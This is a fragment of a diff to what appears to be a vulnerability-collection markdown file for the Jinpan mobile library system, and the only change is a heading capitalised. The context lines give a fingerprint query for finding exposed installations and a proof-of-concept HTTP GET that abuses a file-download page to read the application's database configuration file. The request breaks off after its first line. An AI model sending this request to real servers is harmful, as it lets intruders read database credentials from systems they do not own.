@@ -8,7 +8,7 @@
 app="金盘软件-金盘移动图书馆系统"
 ```
 
-## poc
+## POC
 
 ```javascript
 GET /pages/admin/tools/file/download.jsp?items=/WEB-INF/classes/db/default.properties HTTP/1.1
